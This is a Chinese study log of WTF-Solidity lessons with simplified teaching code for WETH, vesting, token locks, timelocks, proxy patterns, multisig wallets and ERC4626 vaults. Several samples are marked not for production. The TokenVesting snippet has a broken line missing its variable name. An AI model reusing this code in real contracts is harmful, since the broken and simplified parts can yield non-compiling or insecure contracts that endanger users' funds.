    import "https://github.com/AmazingAng/WTF-Solidity/blob/main/34_ERC721/IERC165.sol";

    /**
    * @dev ERC1155接收合约，要接受ERC1155的安全转账，需要实现这个合约
    */
    interface IERC1155Receiver is IERC165 {
        /**
        * @dev 接受ERC1155安全转账`safeTransferFrom` 
        * 需要返回 0xf23a6e61 或 `bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"))`
        */
        function onERC1155Received(
            address operator,
            address from,
            uint256 id,
            uint256 value,
            bytes calldata data
        ) external returns (bytes4);

        /**
        * @dev 接受ERC1155批量安全转账`safeBatchTransferFrom` 
        * 需要返回 0xbc197c81 或 `bytes4(keccak256("onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)"))`
        */
        function onERC1155BatchReceived(
            address operator,
            address from,
            uint256[] calldata ids,
            uint256[] calldata values,
            bytes calldata data
        ) external returns (bytes4);
    }
    ```
    - ERC-1155 主合约 [code](https://github.com/AmazingAng/WTF-Solidity/blob/main/40_ERC1155/ERC1155.sol)
- [103-41] WETH
    - WETH (Wrapped ETH)是ETH的带包装版本。我们常见的WETH，WBTC，WBNB，都是带包装的原生代币。为什么要包装它们？以太币本身并不符合ERC20标准。WETH的开发是为了提高区块链之间的互操作性 ，并使ETH可用于去中心化应用程序（dApps）。它就像是给原生代币穿了一件智能合约做的衣服：穿上衣服的时候，就变成了WETH，符合ERC20同质化代币标准，可以跨链，可以用于dApp；脱下衣服，它可1:1兑换ETH。
    - WETH 符合 ERC20标准，它比普通的 ERC20 多了两个功能：
        - 存款：包装，用户将ETH存入WETH合约，并获得等量的WETH。
        - 取款：拆包装，用户销毁WETH，并获得等量的ETH。
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

    contract WETH is ERC20{
        // 事件：存款和取款
        event  Deposit(address indexed dst, uint wad);
        event  Withdrawal(address indexed src, uint wad);

        // 构造函数，初始化ERC20的名字和代号
        constructor() ERC20("WETH", "WETH"){
        }

        // 回调函数，当用户往WETH合约转ETH时，会触发deposit()函数
        fallback() external payable {
            deposit();
        }
        // 回调函数，当用户往WETH合约转ETH时，会触发deposit()函数
        receive() external payable {
            deposit();
        }

        // 存款函数，当用户存入ETH时，给他铸造等量的WETH
        function deposit() public payable {
            _mint(msg.sender, msg.value);
            emit Deposit(msg.sender, msg.value);
        }

        // 提款函数，用户销毁WETH，取回等量的ETH
        function withdraw(uint amount) public {
            require(balanceOf(msg.sender) >= amount);
            _burn(msg.sender, amount);
            payable(msg.sender).transfer(amount);
            emit Withdrawal(msg.sender, amount);
        }
    }
    ```
- [103-42] 分账
    - 分账就是按照一定比例分钱财。分账合约(PaymentSplit)允许将ETH按权重转给一组账户中，进行分账。
    - 分账合约具有以下几个特点：
        1. 创建合约时定好分账受益人 payees 和每人的份额 shares;
        2. 份额可以是相等，也可以是其他任意比例。
        3. 该合约收到的所有 ETH 中，每个受益人将能够提取与其分配的份额成比例的金额;
        4. 分账合约遵循 Pull Payment 模式，付款不会自动转入账户，而是保存在此合约中。受益人通过调用 release() 函数触发实际转账;
    - 完整代码: [code](https://github.com/AmazingAng/WTF-Solidity/blob/main/42_PaymentSplit/PaymentSplit.sol)
    ```solidity
    function releasable(address _account) public view returns (uint256) {
        // 计算分账合约总收入totalReceived
        uint256 totalReceived = address(this).balance + totalReleased;
        // 调用_pendingPayment计算account应得的ETH
        return pendingPayment(_account, totalReceived, released[_account]);
    }
    function pendingPayment(
        address _account,
        uint256 _totalReceived,
        uint256 _alreadyReleased
    ) public view returns (uint256) {
        // account应得的ETH = 总应得ETH - 已领到的ETH
        return (_totalReceived * shares[_account]) / totalShares - _alreadyReleased;
    }
    ```


### 2024.10.07

- [103-43] 线性释放
    - 代币归属条款，并写一个线性释放ERC20代币的合约。代码由OpenZeppelin的VestingWallet合约简化而来。在传统金融领域，一些公司会向员工和管理层提供股权。但大量股权同时释放会在短期产生抛售压力，拖累股价。因此，公司通常会引入一个归属期来延迟承诺资产的所有权。同样的，在区块链领域，Web3初创公司会给团队分配代币，同时也会将代币低价出售给风投和私募。如果他们把这些低成本的代币同时提到交易所变现，币价将被砸穿，散户直接成为接盘侠。所以，项目方一般会约定代币归属条款（token vesting），在归属期内逐步释放代币，减缓抛压。
    - 线性释放：代币在归属期内匀速释放。
    - 锁仓并线性释放ERC20代币的合约TokenVesting：
        - 项目方规定线性释放的起始时间、归属期和受益人。
        - 项目方将锁仓的ERC20代币转账给TokenVesting合约。
        - 受益人可以调用release函数，从合约中取出释放的代币。
    - 代码：[code](https://github.com/AmazingAng/WTF-Solidity/blob/main/43_TokenVesting/TokenVesting.sol)
    ```solidity
    function release(address token) public {
        // 调用vestedAmount()函数计算可提取的代币数量
        uint256      = vestedAmount(token, uint256(block.timestamp)) - erc20Released[token];
        // 更新已释放代币数量   
        erc20Released[token] += releasable; 
        // 转代币给受益人
        emit ERC20Released(token, releasable);
        IERC20(token).transfer(beneficiary, releasable);
    }

    function vestedAmount(address token, uint256 timestamp) public view returns (uint256) {
        // 合约里总共收到了多少代币（当前余额 + 已经提取）
        uint256 totalAllocation = IERC20(token).balanceOf(address(this)) + erc20Released[token];
        // 根据线性释放公式，计算已经释放的数量
        if (timestamp < start) {
            return 0;
        } else if (timestamp > start + duration) {
            return totalAllocation;
        } else {
            return (totalAllocation * (timestamp - start)) / duration;
        }
    }
    ```
    - 分析一下：`IERC20(token).balanceOf(address(this)) + erc20Released[token];`这样写和直接写死总数的区别是lock之后可以新加入的token也会按照这个规则vest，如果写死的话，新的token打进这个地址会被锁死导致无法vest。
- [103-44] 代币锁
    - 流动性提供者LP代币、锁定流动性、ERC20代币锁合约
    - 代币锁(Token Locker)是一种简单的时间锁合约，它可以把合约中的代币锁仓一段时间，受益人在锁仓期满后可以取走代币。代币锁一般是用来锁仓流动性提供者LP代币的。
        - 用户在去中心化交易所DEX上交易代币，例如Uniswap交易所。DEX和中心化交易所(CEX)不同，去中心化交易所使用自动做市商(AMM)机制，需要用户或项目方提供资金池，以使得其他用户能够即时买卖。简单来说，用户/项目方需要质押相应的币对（比如 ETH/DAI）到资金池中，作为补偿，DEX 会给他们铸造相应的流动性提供者 LP 代币凭证，证明他们质押了相应的份额，供他们收取手续费。
        - 如果项目方毫无征兆的撤出流动性池中的 LP 代币，那么投资者手中的代币就无法变现，直接归零了。这种行为也叫 rug-pull。如果 LP 代币是锁仓在代币锁合约中，在锁仓期结束以前，项目方无法撤出流动性池，也没办法 rug pull。因此代币锁可以防止项目方过早跑路（要小心锁仓期满跑路的情况）。
    - TokenLocker
        - 开发者在部署合约时规定锁仓的时间，受益人地址，以及代币合约。
        - 开发者将代币转入TokenLocker合约。
        - 在锁仓期满，受益人可以取走合约里的代币。
    ```solidity
    constructor(
        IERC20 token_,
        address beneficiary_,
        uint256 lockTime_
    ) {
        require(lockTime_ > 0, "TokenLock: lock time should greater than 0");
        token = token_;
        beneficiary = beneficiary_;
        lockTime = lockTime_;
        startTime = block.timestamp;

        emit TokenLockStart(beneficiary_, address(token_), block.timestamp, lockTime_);
    }

    function release() public {
        require(block.timestamp >= startTime+lockTime, "TokenLock: current time is before release time");

        uint256 amount = token.balanceOf(address(this));
        require(amount > 0, "TokenLock: no tokens to release");

        token.transfer(beneficiary, amount);

        emit Release(msg.sender, address(token), block.timestamp, amount);
    }
    ```
- [103-45] 时间锁
    - 简化自 Compound 的 [Timelock 合约](https://github.com/compound-finance/compound-protocol/blob/master/contracts/Timelock.sol)
    - 时间锁（Timelock）是银行金库和其他高安全性容器中常见的锁定机制。它是一种计时器，旨在防止保险箱或保险库在预设时间之前被打开，即便开锁的人知道正确密码。时间锁被DeFi和DAO大量采用。它是一段代码，他可以将智能合约的某些功能锁定一段时间。它可以大大改善智能合约的安全性，举个例子，假如一个黑客黑了Uniswap的多签，准备提走金库的钱，但金库合约加了2天锁定期的时间锁，那么黑客从创建提钱的交易，到实际把钱提走，需要2天的等待期。在这一段时间，项目方可以找应对办法，投资者可以提前抛售代币减少损失。
    - Timelock：
        - 创建交易，并加入到时间锁队列。
        - 在交易的锁定期满后，执行交易。
        - 后悔了，取消时间锁队列中的某些交易。
    - 项目方一般会把时间锁合约设为重要合约的管理员，例如金库合约，再通过时间锁操作他们。时间锁合约的管理员一般为项目的多签钱包，保证去中心化。
    ```solidity
    /**
     * @dev 创建交易并添加到时间锁队列中。
     * @param target: 目标合约地址
     * @param value: 发送eth数额
     * @param signature: 要调用的函数签名（function signature）
     * @param data: call data，里面是一些参数
     * @param executeTime: 交易执行的区块链时间戳
     *
     * 要求：executeTime 大于 当前区块链时间戳+delay
     */
    function queueTransaction(address target, uint256 value, string memory signature, bytes memory data, uint256 executeTime) public onlyOwner returns (bytes32) {
        // 检查：交易执行时间满足锁定时间
        require(executeTime >= getBlockTimestamp() + delay, "Timelock::queueTransaction: Estimated execution block must satisfy delay.");
        // 计算交易的唯一识别符：一堆东西的hash
        bytes32 txHash = getTxHash(target, value, signature, data, executeTime);
        // 将交易添加到队列
        queuedTransactions[txHash] = true;

        emit QueueTransaction(txHash, target, value, signature, data, executeTime);
        return txHash;
    }
    function cancelTransaction(address target, uint256 value, string memory signature, bytes memory data, uint256 executeTime) public onlyOwner{
        // 计算交易的唯一识别符：一堆东西的hash
        bytes32 txHash = getTxHash(target, value, signature, data, executeTime);
        // 检查：交易在时间锁队列中
        require(queuedTransactions[txHash], "Timelock::cancelTransaction: Transaction hasn't been queued.");
        // 将交易移出队列
        queuedTransactions[txHash] = false;
        emit CancelTransaction(txHash, target, value, signature, data, executeTime);
    }
    function executeTransaction(address target, uint256 value, string memory signature, bytes memory data, uint256 executeTime) public payable onlyOwner returns (bytes memory) {
        bytes32 txHash = getTxHash(target, value, signature, data, executeTime);
        // 检查：交易是否在时间锁队列中
        require(queuedTransactions[txHash], "Timelock::executeTransaction: Transaction hasn't been queued.");
        // 检查：达到交易的执行时间
        require(getBlockTimestamp() >= executeTime, "Timelock::executeTransaction: Transaction hasn't surpassed time lock.");
        // 检查：交易没过期
       require(getBlockTimestamp() <= executeTime + GRACE_PERIOD, "Timelock::executeTransaction: Transaction is stale.");
        // 将交易移出队列
        queuedTransactions[txHash] = false;

        // 获取call data
        bytes memory callData;
        if (bytes(signature).length == 0) {
            callData = data;
        } else {
        // 这里如果采用encodeWithSignature的编码方式来实现调用管理员的函数，请将参数data的类型改为address。不然会导致管理员的值变为类似"0x0000000000000000000000000000000000000020"的值。其中的0x20是代表字节数组长度的意思.
            callData = abi.encodePacked(bytes4(keccak256(bytes(signature))), data);
        }
        // 利用call执行交易
        (bool success, bytes memory returnData) = target.call{value: value}(callData);
        require(success, "Timelock::executeTransaction: Transaction execution reverted.");

        emit ExecuteTransaction(txHash, target, value, signature, data, executeTime);

        return returnData;
    }
    ```


### 2024.10.08

- [103-46] 代理合约
    - 教学代码由OpenZeppelin的[Proxy合约](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/Proxy.sol)简化而来。
    - Solidity合约部署在链上之后，代码是不可变的（immutable）。这样既有优点，也有缺点。有没有办法在合约部署后进行修改或升级呢？答案是有的，那就是代理模式（前面 delegatecall 部分提到过）。
        - 优点：安全，用户知道会发生什么（大部分时候）。
        - 坏处：就算合约中存在bug，也不能修改或升级，只能部署新合约。但是新合约的地址与旧的不一样，且合约的数据也需要花费大量gas进行迁移。
    - ![](./content/YuanboXie/proxy-contract.png)
    - 代理模式将合约数据和逻辑分开，分别保存在不同合约中。数据（状态变量）存储在代理合约中，而逻辑（函数）保存在另一个逻辑合约中。代理合约（Proxy）通过delegatecall，将函数调用全权委托给逻辑合约（Implementation）执行，再把最终的结果返回给调用者（Caller）。代理模式主要有两个好处：
        - 可升级：当我们需要升级合约的逻辑时，只需要将代理合约指向新的逻辑合约。
        - 省gas：如果多个合约复用一套逻辑，我们只需部署一个逻辑合约，然后再部署多个只保存数据的代理合约，指向逻辑合约。
    - 注意：Logic合约和Proxy合约的状态变量存储结构需要完全相同。
    - 示例代码：[code](https://github.com/AmazingAng/WTF-Solidity/blob/main/46_ProxyContract/ProxyContract.sol)
    ```solidity
    /**
    * @dev Proxy合约的所有调用都通过`delegatecall`操作码委托给另一个合约执行。后者被称为逻辑合约（Implementation）。委托调用的返回值，会直接返回给Proxy的调用者。
    */
    contract Proxy {
        address public implementation; // 逻辑合约地址。implementation 合约同一个位置的状态变量类型必须和 Proxy 合约的相同，不然会报错。

        constructor(address implementation_){
            implementation = implementation_;
        }
    
        fallback() external payable { // 回调函数，调用`_delegate()`函数将本合约的调用委托给 `implementation` 合约
            _delegate(); 
        }

        function _delegate() internal { // 【！！！关键代码！！！】将调用委托给逻辑合约运行
            assembly { // 【使用内联汇编来实现：让本来不能有返回值的回调函数有了返回值】
                let _implementation := sload(0) // 读取位置为0的storage，也就是implementation地址。
                calldatacopy(0, 0, calldatasize()) // calldatacopy(t, f, s)：将calldata（输入数据）从位置f开始复制s字节到mem（内存）的位置t

                // 利用delegatecall调用implementation合约
                // delegatecall操作码的参数分别为：gas, 目标合约地址，input mem起始位置，input mem长度，output area mem起始位置，output area mem长度
                // output area起始位置和长度位置，所以设为0
                // delegatecall成功返回1，失败返回0
                let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0)
                returndatacopy(0, 0, returndatasize()) // returndatacopy(t, f, s)：将returndata（输出数据）从位置f开始复制s字节到mem（内存）的位置t。

                switch result
                case 0 { // failed
                    revert(0, returndatasize()) // revert revert(p, s)：终止函数执行, 回滚状态，返回数据mem[p..(p+s))。
                }
                default { // success
                    return(0, returndatasize()) // return(p, s)：终止函数执行, 返回数据mem[p..(p+s))。
                }
            }
        }
    }

    contract Logic {
        address public implementation; // 与Proxy保持一致，防止插槽冲突，Logic 合约本身不用这个变量
        uint public x = 99; 
        event CallSuccess();
        function increment() external returns(uint) {
            emit CallSuccess();
            return x + 1;
        }
    }

    contract Caller{
        address public proxy; // 代理合约地址
        constructor(address proxy_){ proxy = proxy_; }
        function increase() external returns(uint) { // 通过代理合约调用 increase()函数
            ( , bytes memory data) = proxy.call(abi.encodeWithSignature("increment()"));
            return abi.decode(data,(uint));
        }
    }
    ```
- [103-47] 可升级合约
    - 可升级合约（Upgradeable Contract）,这里的可能有安全问题，不要用于生产环境。可升级合约，就是一个可以更改逻辑合约的代理合约。此处的示例代码没有用内联汇编，
    - 实现一个简单的可升级合约，它包含3个合约：代理合约，旧的逻辑合约，和新的逻辑合约。[code](https://github.com/AmazingAng/WTF-Solidity/blob/main/47_Upgrade/Upgrade.sol) 这个 code 是个简单示例。
- [103-48] 透明代理
    - 代理合约的选择器冲突（Selector Clash）以及这一问题的解决方案：透明代理（Transparent Proxy）。教学代码简化自:[TransparentUpgradeableProxy.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/transparent/TransparentUpgradeableProxy.sol)
    - 智能合约中，函数选择器（selector）是函数签名的哈希的前4个字节。例如mint(address account)的选择器为bytes4(keccak256("mint(address)"))，也就是0x6a627842。由于函数选择器仅有4个字节，范围很小，因此两个不同的函数可能会有相同的选择器，例如下面两个函数：
    ```solidity
    // 选择器冲突的例子
    contract Foo {
        function burn(uint256) external {}
        function collate_propagate_storage(bytes16) external {}
    }
    ```
    - 这种情况被称为“选择器冲突”。在这种情况下，EVM无法通过函数选择器分辨用户调用哪个函数，因此该合约无法通过编译。由于代理合约和逻辑合约是两个合约，就算他们之间存在“选择器冲突”也可以正常编译，这可能会导致很严重的安全事故。举个例子，如果逻辑合约的a函数和代理合约的升级函数的选择器相同，那么管理人就会在调用a函数的时候，将代理合约升级成一个黑洞合约，后果不堪设想。目前，有两个可升级合约标准解决了这一问题：透明代理Transparent Proxy和通用可升级代理UUPS。
    - 透明代理的逻辑非常简单：管理员可能会因为“函数选择器冲突”，在调用逻辑合约的函数时，误调用代理合约的可升级函数。那么限制管理员的权限，不让他调用任何逻辑合约的函数，就能解决冲突：
        - 管理员变为工具人，仅能调用代理合约的可升级函数对合约升级，不能通过回调函数调用逻辑合约。
        - 其它用户不能调用可升级函数，但是可以调用逻辑合约的函数。
    ```solidity
    fallback() external payable {
        require(msg.sender != admin);
        (bool success, bytes memory data) = implementation.delegatecall(msg.data);
    }
    function upgrade(address newImplementation) external {
        if (msg.sender != admin) revert();
        implementation = newImplementation;
    }
    ```
### 2024.10.09

- [103-49] 通用可升级代理
    - 通用可升级代理（UUPS，universal upgradeable proxy standard）,代码由 OpenZeppelin 的 UUPSUpgradeable 简化而成，不应用于生产。 示例代码 [code](https://github.com/AmazingAng/WTF-Solidity/blob/main/49_UUPS/UUPS.sol)
    - UUPS（universal upgradeable proxy standard，通用可升级代理）将升级函数放在逻辑合约中。这样一来，如果有其它函数与升级函数存在“选择器冲突”，编译时就会报错。
    ```solidity
    contract UUPSProxy {
        address public implementation; // 逻辑合约地址
        address public admin; // admin地址
        string public words; // 字符串，可以通过逻辑合约的函数改变
        constructor(address _implementation){
            admin = msg.sender;
            implementation = _implementation;
        }
        fallback() external payable {
            (bool success, bytes memory data) = implementation.delegatecall(msg.data);
        }
    }
    // UUPS逻辑合约（升级函数写在逻辑合约内）
    contract UUPS1{
        // 状态变量和proxy合约一致，防止插槽冲突
        address public implementation; 
        address public admin; 
        string public words; // 字符串，可以通过逻辑合约的函数改变

        // 改变proxy中状态变量，选择器： 0xc2985578
        function foo() public{
            words = "old";
        }

        // 升级函数，改变逻辑合约地址，只能由admin调用。选择器：0x0900f010
        // UUPS中，逻辑函数中必须包含升级函数，不然就不能再升级了。
        function upgrade(address newImplementation) external {
            require(msg.sender == admin);
            implementation = newImplementation;
        }
    }
    ```
- [103-50] 多签钱包
    - 极简版多签钱包合约。教学代码（150行代码）由gnosis safe合约（几千行代码）简化而成。
    - 多签钱包，多个私钥持有者（多签人）授权后才能执行：例如钱包由3个多签人管理，每笔交易需要至少2人签名授权。多签钱包可以防止单点故障（私钥丢失，单人作恶），更加去中心化，更加安全，被很多DAO采用。Gnosis Safe 多签钱包是以太坊最流行的多签钱包，管理近400亿美元资产，合约经过审计和实战测试，支持多链（以太坊，BSC，Polygon等），并提供丰富的 DAPP 支持。在以太坊上的多签钱包其实是智能合约，属于合约钱包。
    - 多签合约：[MultisigWallet.sol](https://github.com/AmazingAng/WTF-Solidity/blob/main/50_MultisigWallet/MultisigWallet.sol)
        - 设置多签人和门槛（链上）：初始化多签人列表和执行门槛（至少n个多签人签名授权后，交易才能执行）。
        - 创建交易（链下）：一笔待授权的交易包含以下内容
            - to：目标合约。
            - value：交易发送的以太坊数量。
            - data：calldata，包含调用函数的选择器和参数。
            - nonce：初始为0，随着多签合约每笔成功执行的交易递增的值，可以防止签名重放攻击。
            - chainid：链id，防止不同链的签名重放攻击。
        - 收集多签签名（链下）：将上一步的交易ABI编码并计算哈希，得到交易哈希，然后让多签人签名，并拼接到一起的到打包签名。
        - 调用多签合约的执行函数，验证签名并执行交易（链上）。
    ```solidity
    function execTransaction(
        address to,
        uint256 value,
        bytes memory data,
        bytes memory signatures
    ) public payable virtual returns (bool success) {
        bytes32 txHash = encodeTransactionData(to, value, data, nonce, block.chainid);
        nonce++;  // 增加nonce
        checkSignatures(txHash, signatures); // 检查签名
        // 利用call执行交易，并获取交易结果
        (success, ) = to.call{value: value}(data);
        require(success , "WTF5004");
        if (success) emit ExecutionSuccess(txHash);
        else emit ExecutionFailure(txHash);
    }

    function checkSignatures(
        bytes32 dataHash,
        bytes memory signatures
    ) public view {
        uint256 _threshold = threshold;
        require(_threshold > 0, "WTF5005");
        require(signatures.length >= _threshold * 65, "WTF5006");

        // 利用 currentOwner > lastOwner 确定签名来自不同多签（多签地址递增）[传递的签名按照地址大小排序]
        address lastOwner = address(0); 
        address currentOwner;
        uint8 v;
        bytes32 r;
        bytes32 s;
        uint256 i;
        for (i = 0; i < _threshold; i++) {
            (v, r, s) = signatureSplit(signatures, i);
            // 利用ecrecover检查签名是否有效
            currentOwner = ecrecover(keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", dataHash)), v, r, s);
            require(currentOwner > lastOwner && isOwner[currentOwner], "WTF5007");
            lastOwner = currentOwner;
        }
    }
  
    function signatureSplit(bytes memory signatures, uint256 pos)
        internal
        pure
        returns (
            uint8 v,
            bytes32 r,
            bytes32 s
        )
    {
        // 签名的格式：{bytes32 r}{bytes32 s}{uint8 v}
        assembly {
            let signaturePos := mul(0x41, pos)
            r := mload(add(signatures, add(signaturePos, 0x20)))
            s := mload(add(signatures, add(signaturePos, 0x40)))
            v := and(mload(add(signatures, add(signaturePos, 0x41))), 0xff)
        }
    }
    ```
- [103-51] ERC4626 代币化金库标准：ERC4626 对于 DeFi 的重要性不亚于 ERC721 对于 NFT 的重要性。
    - 金库合约是 DeFi 乐高中的基础，允许把基础资产（代币）质押到合约中，换取一定收益。可用于：
        - 收益农场: 在 Yearn Finance 中，你可以质押 USDT 获取利息；
        - 借贷: 在 AAVE 中，你可以出借 ETH 获取存款利息和贷款；
        - 质押: 在 Lido 中，你可以质押 ETH 参与 ETH 2.0 质押，得到可以生息的 stETH；
    - 由于金库合约缺乏标准，写法五花八门，一个收益聚合器需要写很多接口对接不同的 DeFi 项目。ERC4626 代币化金库标准（Tokenized Vault Standard）横空出世，使得 DeFi 能够轻松扩展。它具有以下优点:
        - 代币化: ERC4626 继承了 ERC20，向金库存款时，将得到同样符合 ERC20 标准的金库份额，比如质押 ETH，自动获得 stETH；
        - 更好的流通性: 由于代币化，你可以在不取回基础资产的情况下，利用金库份额做其他事情。拿 Lido 的 stETH 为例，你可以用它在 Uniswap 上提供流动性或交易，而不需要取出其中的 ETH；
        - 更好的可组合性: 有了标准之后，用一套接口可以和所有 ERC4626 金库交互，让基于金库的应用、插件、工具开发更容易；
    - ERC4626 标准主要实现了以下几个逻辑：
        - ERC20: ERC4626 继承了 ERC20，金库份额就是用 ERC20 代币代表的：用户将特定的 ERC20 基础资产（比如 WETH）存进金库，合约会给他铸造特定数量的金库份额代币；当用户从金库中提取基础资产时，会销毁相应数量的金库份额代币。
        - 存款逻辑：让用户存入基础资产，并铸造相应数量的金库份额。
        - 提款逻辑：让用户销毁金库份额，并提取金库中相应数量的基础资产。
        - 会计和限额逻辑：ERC4626 标准中其他的函数是为了统计金库中的资产，存款/提款限额，和存款/提款的基础资产和金库份额数量。
    - IERC4626 接口合约
        - deposit 和 mint 区别：
    ```solidity
    pragma solidity ^0.8.0;
    import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
    import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

    /**
    * @dev ERC4626 "代币化金库标准"的接口合约
    * https://eips.ethereum.org/EIPS/eip-4626[ERC-4626].
    */
    interface IERC4626 is IERC20, IERC20Metadata {
        event Deposit(address indexed sender, address indexed owner, uint256 assets, uint256 shares);
        event Withdraw(address indexed sender,address indexed receiver,address indexed owner,uint256 assets,uint256 shares);
        // 返回金库的基础资产代币地址 （用于存款，取款）必须是 ERC20 代币合约地址
        function asset() external view returns (address assetTokenAddress);
        /**
        * @dev 存款函数: 用户向金库存入 assets 单位的基础资产，然后合约铸造 shares 单位的金库额度给 receiver 地址
        * - 必须释放 Deposit 事件.
        * - 如果资产不能存入，必须 revert，比如存款数额大大于上限等。
        */
        function deposit(uint256 assets, address receiver) external returns (uint256 shares);

        /**
        * @dev 铸造函数: 用户需要存入 assets 单位的基础资产，然后合约给 receiver 地址铸造 share 数量的金库额度
        * - 必须释放 Deposit 事件.
        * - 如果全部金库额度不能铸造，必须revert，比如铸造数额大大于上限等。
        */
        function mint(uint256 shares, address receiver) external returns (uint256 assets);

        /**
        * @dev 提款函数: owner 地址销毁 share 单位的金库额度，然后合约将 assets 单位的基础资产发送给 receiver 地址
        * - 释放 Withdraw 事件
        * - 如果全部基础资产不能提取，将revert
        */
        function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);

        /**
        * @dev 赎回函数: owner 地址销毁 shares 数量的金库额度，然后合约将 assets 单位的基础资产发给 receiver 地址
        * - 释放 Withdraw 事件
        * - 如果金库额度不能全部销毁，则revert
        */
        function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);

        /*//////////////////////////////////////////////////////////////
                                会计逻辑
        //////////////////////////////////////////////////////////////*/
        /**
        * @dev 返回金库中管理的基础资产代币总额
        * - 要包含利息
        * - 要包含费用
        * - 不能revert
        */
        function totalAssets() external view returns (uint256 totalManagedAssets);

        /**
        * @dev 返回利用一定数额基础资产可以换取的金库额度
        * - 不要包含费用
        * - 不包含滑点
        * - 不能revert
        */
        function convertToShares(uint256 assets) external view returns (uint256 shares);

        /**
        * @dev 返回利用一定数额金库额度可以换取的基础资产
        * - 不要包含费用
        * - 不包含滑点
        * - 不能revert
        */
        function convertToAssets(uint256 shares) external view returns (uint256 assets);

        /**
        * @dev 用于链上和链下用户在当前链上环境模拟存款一定数额的基础资产能够获得的金库额度
        * - 返回值要接近且不大于在同一交易进行存款得到的金库额度
        * - 不要考虑 maxDeposit 等限制，假设用户的存款交易会成功
        * - 要考虑费用
        * - 不能revert
        * NOTE: 可以利用 convertToAssets 和 previewDeposit 返回值的差值来计算滑点
        */
        function previewDeposit(uint256 assets) external view returns (uint256 shares);

        /**
        * @dev 用于链上和链下用户在当前链上环境模拟铸造 shares 数额的金库额度需要存款的基础资产数量
        * - 返回值要接近且不小于在同一交易进行铸造一定数额金库额度所需的存款数量
        * - 不要考虑 maxMint 等限制，假设用户的存款交易会成功
        * - 要考虑费用
        * - 不能revert
        */
        function previewMint(uint256 shares) external view returns (uint256 assets);

        /**
        * @dev 用于链上和链下用户在当前链上环境模拟提款 assets 数额的基础资产需要赎回的金库份额
        * - 返回值要接近且不大于在同一交易进行提款一定数额基础资产所需赎回的金库份额
        * - 不要考虑 maxWithdraw 等限制，假设用户的提款交易会成功
        * - 要考虑费用
        * - 不能revert
        */
        function previewWithdraw(uint256 assets) external view returns (uint256 shares);

        /**
        * @dev 用于链上和链下用户在当前链上环境模拟销毁 shares 数额的金库额度能够赎回的基础资产数量
        * - 返回值要接近且不小于在同一交易进行销毁一定数额的金库额度所能赎回的基础资产数量
        * - 不要考虑 maxRedeem 等限制，假设用户的赎回交易会成功
        * - 要考虑费用
        * - 不能revert.
        */
        function previewRedeem(uint256 shares) external view returns (uint256 assets);

        /*//////////////////////////////////////////////////////////////
                        存款/提款限额逻辑
        //////////////////////////////////////////////////////////////*/
        /**
        * @dev 返回某个用户地址单次存款可存的最大基础资产数额。
        * - 如果有存款上限，那么返回值应该是个有限值
        * - 返回值不能超过 2 ** 256 - 1 
        * - 不能revert
        */
        function maxDeposit(address receiver) external view returns (uint256 maxAssets);

        /**
        * @dev 返回某个用户地址单次铸造可以铸造的最大金库额度
        * - 如果有铸造上限，那么返回值应该是个有限值
        * - 返回值不能超过 2 ** 256 - 1 
        * - 不能revert
        */
        function maxMint(address receiver) external view returns (uint256 maxShares);

        /**
        * @dev 返回某个用户地址单次取款可以提取的最大基础资产额度
        * - 返回值应该是个有限值
        * - 不能revert
        */
        function maxWithdraw(address owner) external view returns (uint256 maxAssets);

        /**
        * @dev 返回某个用户地址单次赎回可以销毁的最大金库额度
        * - 返回值应该是个有限值
        * - 如果没有其他限制，返回值应该是 balanceOf(owner)
        * - 不能revert
        */
        function maxRedeem(address owner) external view returns (uint256 maxShares);
    }
    ```
    - 具体代码：[code](https://github.com/AmazingAng/WTF-Solidity/blob/main/51_ERC4626/ERC4626.sol)
    ```solidity
    contract ERC4626 is ERC20, IERC4626 { // 教学代码，不要用于生产环境
        ERC20 private immutable _asset;  
        uint8 private immutable _decimals;
        constructor(
            ERC20 asset_,
            string memory name_,
            string memory symbol_
        ) ERC20(name_, symbol_) {
            _asset = asset_;
            _decimals = asset_.decimals();
        }
        function asset() public view virtual override returns (address) { return address(_asset); } // 返回 ERC20 Token 地址
        function decimals() public view virtual override(IERC20Metadata, ERC20) returns (uint8) { return _decimals; }
        
        function deposit(uint256 assets, address receiver) public virtual returns (uint256 shares) {
            shares = previewDeposit(assets); // 换算份额
            _asset.transferFrom(msg.sender, address(this), assets);
            _mint(receiver, shares);
            emit Deposit(msg.sender, receiver, assets, shares);
        }

        function mint(uint256 shares, address receiver) public virtual returns (uint256 assets) {
            assets = previewMint(shares);
            _asset.transferFrom(msg.sender, address(this), assets);
            _mint(receiver, shares);
            emit Deposit(msg.sender, receiver, assets, shares);
        }

        function withdraw(
            uint256 assets,
            address receiver,
            address owner
        ) public virtual returns (uint256 shares) {
            shares = previewWithdraw(assets);
            // 如果调用者不是 owner，则检查并更新授权 【 approve-transferFrom 逻辑，所以这里要先扣 approve】
            if (msg.sender != owner) {
                _spendAllowance(owner, msg.sender, shares);
            }
            _burn(owner, shares);
            _asset.transfer(receiver, assets);
            emit Withdraw(msg.sender, receiver, owner, assets, shares);
        }

        function redeem(
            uint256 shares,
            address receiver,
            address owner
        ) public virtual returns (uint256 assets) {
            assets = previewRedeem(shares);
            if (msg.sender != owner) {
                _spendAllowance(owner, msg.sender, shares);
            }
            _burn(owner, shares);
            _asset.transfer(receiver, assets);
            emit Withdraw(msg.sender, receiver, owner, assets, shares);
        }

        function totalAssets() public view virtual returns (uint256){ return _asset.balanceOf(address(this)); } // Vault 持仓
        function convertToShares(uint256 assets) public view virtual returns (uint256) {
            uint256 supply = totalSupply();                                // 当前发行的份额
            return supply == 0 ? assets : assets * supply / totalAssets(); // 如果 supply 为 0，那么 1:1 铸造金库份额，如果 supply 不为0，那么按比例铸造【由于资产有利息或者其他因素，这里的比例最后不会是1:1，所以需要按比例分配】
        }
        function convertToAssets(uint256 shares) public view virtual returns (uint256) {
            uint256 supply = totalSupply();
